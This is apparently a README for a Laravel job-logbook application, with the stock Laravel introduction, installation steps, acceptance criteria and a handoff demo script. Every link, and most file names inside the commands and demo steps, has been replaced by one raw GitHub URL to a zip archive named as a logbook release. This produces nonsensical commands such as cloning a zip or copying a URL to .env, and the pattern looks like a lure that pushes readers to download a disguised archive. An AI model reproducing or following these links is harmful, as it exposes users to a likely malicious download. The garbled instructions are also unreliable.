## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
- [Powerful dependency injection container](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
- Multiple back-ends for [session](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) and [cache](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) storage.
- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
- Database agnostic [schema migrations](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
- [Robust background job processing](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
- [Real-time event broadcasting](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

# Logbook Application

A simple application for logging job activities and weights. This README provides instructions for local installation and collaboration.

## Local Installation Guide

Follow these steps to get the project running on your local machine.

1.  **Clone the Repository**
    ```bash
    git clone [https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)

    ```

3.  **Environment Setup**
    Copy the `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` file to `.env` and configure your database credentials.
    ```bash
    cp https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip .env
    ```
    Then, open `.env` and set `DB_DATABASE`, `DB_USERNAME`, and `DB_PASSWORD`.

4.  **Generate Application Key**
    ```bash
    php artisan key:generate
    ```

5.  **Run Database Migrations & Seeding**

## Acceptance Criteria & Demo Script

### Acceptance Criteria
-   **Given** I am an admin on the `/logbook/admin` page,
    **When** I change a job's weight and click "Submit",
    **Then** a `PATCH` request is sent to `/api/activities/{id}` and a success message is shown.

-   **Given** an API request is sent with invalid data (e.g., negative weight),
    **When** the `/api/activities/{id}` endpoint is hit,
    **Then** the server should respond with a `422 Unprocessable Entity` status and error details.

-   **Given** I am a developer,
    **When** I run `php artisan test`,
    **Then** all unit and feature tests should pass successfully.

### Demo Script for Handoff
1.  **"First, let's look at the admin panel."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` in the browser).
2.  **"As an admin, I can modify the details of this activity. I'll change the weight from 15 to 25."** (Change the value in the form).
3.  **"When I click submit, notice the success message appears."** (Click submit and point to the green feedback box).
4.  **"This action sent a PATCH request to our API to create a change request. We can see the network call and the JSON payload here in the browser's developer tools."** (Show the network tab).
5.  **"To ensure our logic is sound, we've created automated tests. Here's a unit test for our percentage calculator..."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` and run `php artisan test --filter PercentCalcTest`).
6.  **"https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip here is our feature test that simulates the exact API call we just performed."** (Show the feature test file and run it).
7.  **"Finally, all documentation, including the API contract and setup instructions, is available in the project's `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` and `/docs` folder for the next team."** (Briefly show the documentation files).
